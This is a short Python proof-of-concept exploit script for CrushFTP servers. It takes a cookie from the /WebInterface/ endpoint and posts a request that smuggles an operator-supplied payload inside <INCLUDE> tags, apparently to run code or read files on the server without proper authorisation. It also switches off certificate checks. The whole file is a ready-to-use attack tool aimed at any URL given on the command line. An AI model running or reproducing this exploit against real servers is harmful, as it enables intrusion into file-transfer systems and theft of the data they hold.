import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning



requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def exploit(url, payload):
    url2 = url+"/WebInterface/"
    r = requests.post(url2,verify=False)
    cookies = r.cookies

    data ={
        "command": "exists",
        "paths": f"<INCLUDE>{payload}</INCLUDE>",
        "c2f": cookies.get('currentAuth', ''),
    }

    r = requests.post(url2, data=data, cookies=cookies,verify=False)
    print(r.text)

def main():
    parser = argparse.ArgumentParser(description="POC for executing a payload on CrushFTP")
    parser.add_argument("url", type=str, help="URL of the CrushFTP server")
    parser.add_argument("payload", type=str, help="Payload to execute")
    args = parser.parse_args()

    exploit(args.url, args.payload)

if __name__ == "__main__":
    main()
